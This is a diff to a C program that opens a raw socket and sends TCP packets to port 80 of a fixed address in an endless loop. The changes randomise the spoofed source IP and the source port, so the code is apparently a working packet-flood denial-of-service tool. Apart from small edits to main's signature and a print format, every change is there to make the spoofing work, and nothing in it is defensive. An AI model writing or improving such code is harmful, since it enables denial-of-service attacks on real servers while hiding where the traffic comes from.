@@ -48,7 +48,7 @@ csum (unsigned short *ptr, int nbytes)
 }
 #define DEST_IP_ADDR	"10.188.117.32"
 int
-main (void)
+main (int argc, char **argv)
 {
   //Create a raw socket
   int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -61,7 +61,7 @@ main (void)
   struct sockaddr_in sin;
   struct pseudo_header psh;
 
-  strcpy (source_ip, "216.241.237.121");
+  // strcpy (source_ip, "216.241.237.121");
 
   sin.sin_family = AF_INET;
   sin.sin_port = htons (80);
@@ -130,14 +130,15 @@ main (void)
   while (1)
   {
      strcpy (source_ip, "216.241.237.121");
+     psh.source_address = inet_addr (source_ip);
      // sprintf (source_ip,"%d.%d.%d.%d",rand()%255,rand()%255,rand()%255,rand()%255);
-     // sprintf (source_ip, "216.241.237.%d", rand()%255);
+     sprintf (source_ip, "216.241.237.%d", rand()%255);
      iph->saddr = inet_addr (source_ip);	//Spoof the source ip address
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
      tcph->source = htons (rand()%65535);
      memcpy (&psh.tcp, tcph, sizeof (struct tcphdr));
      tcph->check = csum ((unsigned short *) &psh, sizeof (struct pseudo_header));
-     printf ("source ip(%16s)(%d)\n", source_ip, tcph->source);
+     printf ("source ip(%-20s)(%5d)\n", source_ip, tcph->source);
   //Send the packet
   if (sendto (s,		/* our socket */
 	      datagram,		/* the buffer containing headers and data */
